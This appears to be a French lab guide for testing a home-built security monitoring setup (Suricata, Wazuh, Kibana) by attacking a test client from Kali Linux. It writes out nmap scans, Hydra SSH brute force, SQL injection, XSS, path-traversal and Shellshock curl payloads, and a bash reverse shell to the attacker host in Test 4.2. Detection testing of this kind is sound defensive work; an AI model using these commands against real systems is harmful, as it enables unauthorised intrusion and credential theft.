\# Guide de Tests - Mini-SOC Platform

\## Table des Matières

1\. \[Préparation des Tests](#préparation-des-tests)

2\. \[Test 1: Scan de Ports (Nmap)](#test-1-scan-de-ports-nmap)

3\. \[Test 2: Brute Force SSH](#test-2-brute-force-ssh)

4\. \[Test 3: Attaques HTTP](#test-3-attaques-http)

5\. \[Test 4: Détection de Malware](#test-4-détection-de-malware)

6\. \[Test 5: File Integrity Monitoring](#test-5-file-integrity-monitoring)

7\. \[Validation des Résultats](#validation-des-résultats)

---

\## Préparation des Tests

\### Environnement de Test

\*\*Machine d'attaque:\*\* Kali Linux (192.168.229.148)

\*\*Cibles:\*\*

\- Linux Client-1: 192.168.229.145 (HIDS)

\- Réseau surveillé: 192.168.229.0/24 (NIDS)

\### Outils Utilisés

\- \*\*Nmap:\*\* Scan de ports et découverte réseau

\- \*\*Hydra:\*\* Brute force SSH

\- \*\*Curl:\*\* Attaques HTTP

\- \*\*Metasploit:\*\* Exploitation (optionnel)

\- \*\*Nikto:\*\* Scan de vulnérabilités web (optionnel)

\### Vérifications Préalables

\#### 1. Vérifier que tous les services sont actifs

\*\*Sur Elastic Stack:\*\*

```bash

sudo systemctl status elasticsearch

sudo systemctl status kibana

```

\*\*Sur Wazuh Manager:\*\*

```bash

sudo systemctl status wazuh-manager

sudo /var/ossec/bin/agent\_control -l

```

\*\*Sur Suricata:\*\*

```bash

sudo systemctl status suricata

sudo tail -f /var/log/suricata/fast.log \&

```

\*\*Sur Linux Client:\*\*

```bash

sudo systemctl status wazuh-agent

```

\#### 2. Ouvrir Kibana Dashboard

URL: `http://192.168.229.143:5601`

Naviguer vers le dashboard \*\*"Mini-SOC Main Dashboard"\*\*

\#### 3. Préparer la collecte de preuves

Créer un dossier pour les captures d'écran:

```bash

mkdir ~/test-results

```

---

\## Test 1: Scan de Ports (Nmap)

\### Objectif

Détecter les scans de ports réseau via Suricata NIDS

\### Procédure

\*\*Sur Kali Linux:\*\*

\#### Test 1.1: Scan TCP SYN (Stealth Scan)

```bash

sudo nmap -sS -p- 192.168.229.145

```

\*\*Résultat attendu:\*\*

\- Durée: ~2-5 minutes

\- Ports découverts: 22 (SSH), 1514 (Wazuh)

\#### Test 1.2: Scan UDP

```bash

sudo nmap -sU -p 1-1000 192.168.229.145

```

\#### Test 1.3: Scan avec détection OS

```bash

sudo nmap -O 192.168.229.145

```

\#### Test 1.4: Scan agressif

```bash

sudo nmap -A -T4 192.168.229.145

```

\### Validation

\*\*Dans Kibana:\*\*

1\. Aller sur le dashboard

2\. Section \*\*"Network Attack Signatures"\*\*

3\. Vérifier la présence d'alertes:

&nbsp; - `ET SCAN Potential SSH Scan`

&nbsp; - `ET SCAN NMAP Scripting Engine User-Agent Detected`

&nbsp; - `GPL SCAN nmap XMAS`

\*\*Dans Suricata logs:\*\*

```bash

\# Sur Suricata VM

sudo grep -i nmap /var/log/suricata/fast.log

```

\*\*Preuve:\*\*

\- 📸 Screenshot: Kibana montrant les alertes Nmap

\- 📸 Screenshot: Terminal Kali avec la commande Nmap

---

\## Test 2: Brute Force SSH

\### Objectif

Détecter les tentatives de connexion SSH par force brute via Wazuh HIDS

\### Procédure

\*\*Sur Kali Linux:\*\*

\#### Test 2.1: Tentatives manuelles (simple)

```bash

\# 10 tentatives de connexion avec des mots de passe incorrects

for i in {1.. 10}; do

&nbsp; ssh fakeuser@192.168.229.145

&nbsp; # Taper n'importe quel mot de passe incorrect

done

```

\#### Test 2.2: Brute force avec Hydra (avancé)

```bash

\# Créer une petite wordlist

echo -e "password\\n123456\\nadmin\\nroot\\nsocadmin" > passwords.txt



\# Lancer Hydra

hydra -l socadmin -P passwords.txt 192.168.229.145 ssh -t 4 -V

```

\*\*Note:\*\* Le vrai mot de passe "socadmin" sera trouvé, ce qui est normal.

\#### Test 2.3: Brute force avec Medusa

```bash

medusa -h 192.168.229.145 -u root -P passwords.txt -M ssh

```

\### Validation

\*\*Dans Kibana:\*\*

1\. Dashboard → Section \*\*"Alert Severity"\*\*

2\. Filtrer par: `rule.description:  "sshd"`

3\. Vérifier les alertes:

&nbsp; - `sshd:  authentication failed`

&nbsp; - `sshd: brute force trying to get access to the system`

&nbsp; - `Multiple authentication failures`

\*\*Sur Linux Client (optionnel):\*\*

```bash

sudo tail -f /var/log/auth.log

```

\*\*Sur Wazuh Manager:\*\*

```bash

sudo tail -f /var/ossec/logs/alerts/alerts.json | grep -i ssh

```

\*\*Preuve:\*\*

\- 📸 Screenshot: Kibana montrant les alertes SSH brute force

\- 📸 Screenshot: Terminal Kali avec Hydra en exécution

\- 📸 Screenshot: Détail d'une alerte Wazuh dans Kibana

---

\## Test 3: Attaques HTTP

\### Objectif

Détecter les attaques web via Suricata NIDS

\### Prérequis

Installer un serveur web sur Linux Client (si pas déjà fait):

```bash

\# Sur Linux Client

sudo apt install apache2 -y

sudo systemctl start apache2

```

\### Procédure

\*\*Sur Kali Linux:\*\*

\#### Test 3.1: Path Traversal

```bash

\# Tentative d'accès à /etc/passwd

curl "http://192.168.229.145/../../../../etc/passwd"

curl "http://192.168.229.145/../../../etc/passwd"

curl "http://192.168.229.145/.. %2f..%2f..%2fetc/passwd"

```

\#### Test 3.2: SQL Injection

```bash

\# Tentatives d'injection SQL

curl "http://192.168.229.145/? id=1' OR '1'='1"

curl "http://192.168.229.145/?user=admin'--"

curl "http://192.168.229.145/?id=1 UNION SELECT NULL--"

```

\#### Test 3.3: XSS (Cross-Site Scripting)

```bash

curl "http://192.168.229.145/? search=<script>alert('XSS')</script>"

curl "http://192.168.229.145/?name=<img src=x onerror=alert(1)>"

```

\#### Test 3.4: User-Agent Malveillant

```bash

curl -A "() { :; }; /bin/bash -c 'cat /etc/passwd'" http://192.168.229.145

curl -A "Nikto/2.1.5" http://192.168.229.145

```

\#### Test 3.5: Scan avec Nikto (optionnel)

```bash

nikto -h http://192.168.229.145

```

\### Validation

\*\*Dans Kibana:\*\*

1\. Dashboard → Section \*\*"Network Attack Signatures"\*\*

2\. Vérifier les alertes HTTP:

&nbsp; - `ET WEB\_SERVER Possible SQL Injection Attempt`

&nbsp; - `ET WEB\_SERVER Possible XSS Attempt`

&nbsp; - `ET WEB\_SERVER Suspicious User Agent`

&nbsp; - `SURICATA HTTP unable to match response to request`

\*\*Dans Suricata logs:\*\*

```bash

sudo grep -i "HTTP" /var/log/suricata/fast.log

```

\*\*Preuve:\*\*

\- 📸 Screenshot: Alertes HTTP dans Kibana

\- 📸 Screenshot: Commandes curl dans le terminal

\- 📸 Screenshot: Détail d'une signature Suricata

---

\## Test 4: Détection de Malware

\### Objectif

Tester la détection de fichiers suspects via Wazuh

\### Procédure

\*\*Sur Linux Client:\*\*

\#### Test 4.1: Télécharger un fichier de test EICAR

```bash

\# EICAR est un fichier de test standard pour les antivirus (inoffensif)

cd /tmp

wget http://www.eicar.org/download/eicar. com.txt

cat eicar.com.txt

```

\#### Test 4.2: Créer un script suspect

```bash

\# Créer un script qui ressemble à un reverse shell

cat > /tmp/suspicious. sh << 'EOF'

\#!/bin/bash

/bin/bash -i >\& /dev/tcp/192.168.229.148/4444 0>\&1

EOF



chmod +x /tmp/suspicious.sh

```

\### Validation

\*\*Dans Kibana:\*\*

1\. Rechercher: `rule.description: \*file\* OR \*integrity\*`

2\. Vérifier les alertes Wazuh sur les fichiers suspects

\*\*Sur Wazuh Manager:\*\*

```bash

sudo grep -i "integrity" /var/ossec/logs/alerts/alerts.json

```

\*\*Preuve:\*\*

\- 📸 Screenshot: Alertes de détection de fichiers

---

\## Test 5: File Integrity Monitoring

\### Objectif

Vérifier que Wazuh détecte les modifications de fichiers critiques

\### Procédure

\*\*Sur Linux Client:\*\*

\#### Test 5.1: Modifier un fichier dans /etc

```bash

\# Créer un nouveau fichier dans /etc

sudo touch /etc/test-file.conf

echo "test content" | sudo tee /etc/test-file.conf



\# Attendre 2-3 minutes (syscheck s'exécute périodiquement)

```

\#### Test 5.2: Modifier /etc/passwd (simulé)

```bash

\# Ajouter un commentaire (sans risque)

echo "# Test comment" | sudo tee -a /etc/passwd

```

\#### Test 5.3: Créer un fichier dans /home

```bash

touch ~/suspicious-file.txt

echo "malicious content" > ~/suspicious-file.txt

```

\### Validation

\*\*Dans Kibana:\*\*

1\. Filtrer: `rule.description: \*integrity\* OR \*syscheck\*`

2\. Vérifier les événements:

&nbsp; - `File added`

&nbsp; - `File modified`

&nbsp; - `Integrity checksum changed`

\*\*Sur Linux Client:\*\*

```bash

\# Forcer une vérification immédiate

sudo /var/ossec/bin/wazuh-control restart

```

\*\*Preuve:\*\*

\- 📸 Screenshot: Alertes FIM (File Integrity Monitoring)

---

\## Validation des Résultats

\### Checklist de Validation

| Test | NIDS (Suricata) | HIDS (Wazuh) | Kibana Dashboard |

|------|----------------|--------------|------------------|

| ✅ Scan Nmap | ✅ Détecté | ⚠️ Optionnel | ✅ Affiché |

| ✅ Brute Force SSH | ⚠️ Optionnel | ✅ Détecté | ✅ Affiché |

| ✅ Attaques HTTP | ✅ Détecté | ⚠️ Optionnel | ✅ Affiché |

| ✅ Fichiers suspects | N/A | ✅ Détecté | ✅ Affiché |

| ✅ FIM | N/A | ✅ Détecté | ✅ Affiché |

\### Métriques Attendues

\*\*Dans le Dashboard Kibana:\*\*

1\. \*\*Total Alerts:\*\* > 50 alertes générées

2\. \*\*Attacking IPs:\*\*

&nbsp; - 192.168.229.148 (Kali) doit apparaître en tête

&nbsp; - 192.168.229.143, 147, 145, 1 peuvent apparaître (trafic légitime)

3\. \*\*Alert Severity:\*\*

&nbsp; - syslog: ~33%

&nbsp; - pam: ~33%

&nbsp; - authentication: ~22%

&nbsp; - ossec: ~11%

4\. \*\*Network Attack Signatures:\*\*

&nbsp; - HTTP unable to match response

&nbsp; - ET INFO Http Client Body

&nbsp; - STREAM CLOSEWAIT

&nbsp; - ICMPv4 unknown code

5\. \*\*Targeted Ports:\*\*

&nbsp; - Port 22 (SSH)

&nbsp; - Port 80 (HTTP)

&nbsp; - Ports > 1000

\### Corrélation NIDS/HIDS

\*\*Scénario de corrélation:\*\*

1\. \*\*Kali lance Nmap\*\* → Suricata détecte le scan

2\. \*\*Kali tente SSH brute force\*\* → Wazuh détecte les échecs d'authentification

3\. \*\*Les deux alertes apparaissent dans Kibana\*\* avec la même source IP (192.168.229.148)

\*\*Pour vérifier:\*\*

```bash

\# Dans Kibana Discover

\# Filtrer par:  src\_ip: "192.168.229.148"

\# Observer les alertes des deux sources (Wazuh + Suricata)

```

---

\## Analyse des Faux Positifs

\### Identifier les faux positifs

\*\*Exemples de faux positifs courants:\*\*

\- Trafic inter-VMs légitime détecté comme suspect

\- Mises à jour système déclenchant des alertes FIM

\- Connexions SSH légitimes comptées comme tentatives

\### Ajuster les règles (optionnel)

\*\*Sur Suricata:\*\*

```bash

\# Créer une règle personnalisée pour ignorer le trafic interne

sudo nano /etc/suricata/rules/custom. rules

```

Ajouter:

```

\# Ignorer le trafic de monitoring interne

pass ip 192.168.229.143 any -> any any (msg:"Allow Elasticsearch"; sid:1000001;)

```

\*\*Sur Wazuh:\*\*

Éditer `/var/ossec/etc/ossec.conf`:

```xml

<!-- Ignorer certains événements -->

<localfile>

&nbsp; <log\_format>syslog</log\_format>

&nbsp; <location>/var/log/syslog</location>

&nbsp; <ignore>某些patterns à ignorer</ignore>

</localfile>

```

---

\## Rapport de Tests

\### Template de Rapport

```

=== RAPPORT DE TESTS MINI-SOC ===

Date: \[DATE]

Testeur:  Nidhal Chelhi



1\. TESTS NIDS (Suricata)

&nbsp;  ✅ Scan Nmap détecté:  OUI

&nbsp;  ✅ Attaques HTTP détectées: OUI

&nbsp;  Nombre d'alertes générées: \[X]



2\. TESTS HIDS (Wazuh)

&nbsp;  ✅ Brute Force SSH détecté: OUI

&nbsp;  ✅ File Integrity Monitoring:  OUI

&nbsp;  Nombre d'alertes générées: \[X]



3\. CENTRALISATION (Elastic)

&nbsp;  ✅ Logs Suricata indexés: OUI

&nbsp;  ✅ Logs Wazuh indexés: OUI

&nbsp;  ✅ Dashboard fonctionnel: OUI



4\. CORRÉLATION

&nbsp;  ✅ Alertes corrélées par IP source: OUI

&nbsp;  ✅ Timeline cohérente: OUI



5\. FAUX POSITIFS

&nbsp;  Nombre de faux positifs: \[X]

&nbsp;  Actions correctives: \[DESCRIPTION]



CONCLUSION:

Le système Mini-SOC est opérationnel et détecte efficacement les intrusions

réseau (NIDS) et hôte (HIDS). La centralisation via Elastic Stack permet une

visualisation claire et une corrélation des événements.

```

---

\## Conclusion

Les tests valident le bon fonctionnement de:

\- ✅ Détection réseau (Suricata)

\- ✅ Détection hôte (Wazuh)

\- ✅ Centralisation (Elasticsearch)

\- ✅ Visualisation (Kibana)

\- ✅ Corrélation d'événements

\*\*Prochaine étape:\*\* \[04-user-manual.md](04-user-manual.md)
